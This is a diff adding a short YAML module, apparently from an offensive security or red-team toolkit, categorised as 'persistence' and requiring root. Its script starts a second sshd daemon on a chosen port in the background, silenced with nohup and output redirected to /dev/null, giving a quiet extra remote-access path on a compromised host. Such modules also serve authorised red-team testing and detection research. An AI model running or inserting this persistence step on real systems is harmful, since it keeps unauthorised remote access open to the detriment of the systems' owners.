@@ -1,0 +1,11 @@
+name: "sshd cloner"
+description: "Creates additional sshd process using separate port"
+category: persistence
+need_root: true
+variables:
+  - name: port
+    description: "Port for new process"
+priority: 1000
+tip: "Additional sshd is running on port {{port}}"
+script: |
+  nohup $(which sshd) -p {{port}} >/dev/null 2>&1 &
